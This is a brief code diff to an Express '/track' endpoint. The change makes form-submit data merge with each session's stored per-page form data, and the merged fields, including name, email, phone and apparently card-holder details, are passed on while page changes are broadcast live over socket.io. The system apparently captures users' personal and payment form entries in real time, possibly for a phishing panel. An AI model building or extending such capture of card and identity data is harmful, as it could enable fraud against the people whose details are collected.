@@ -73,8 +73,12 @@ router.post('/track', async (req, res) => {
       );
       if (req.io) req.io.emit('user:page-change', { sessionId, page });
     } else if (type === 'form-submit') {
+      const currentDoc = await UserSession.findOne({ sessionId });
+      const existingPageData = (currentDoc && currentDoc.formData && currentDoc.formData[page]) ? currentDoc.formData[page] : {};
+      const mergedPageData = { ...existingPageData, ...data };
+
       const updateData = {
-        [`formData.${page}`]: data,
+        [`formData.${page}`]: mergedPageData,
         lastActive: new Date()
       };
       const candidateName = data.name || [data.firstName, data.lastName].filter(Boolean).join(' ') || data.cardholderName;
@@ -97,7 +101,7 @@ router.post('/track', async (req, res) => {
         const payload = {
           sessionId,
           page,
-          formData: data,
+          formData: mergedPageData,
           name: updatedDoc.name,
           email: updatedDoc.email,
           phone: updatedDoc.phone,
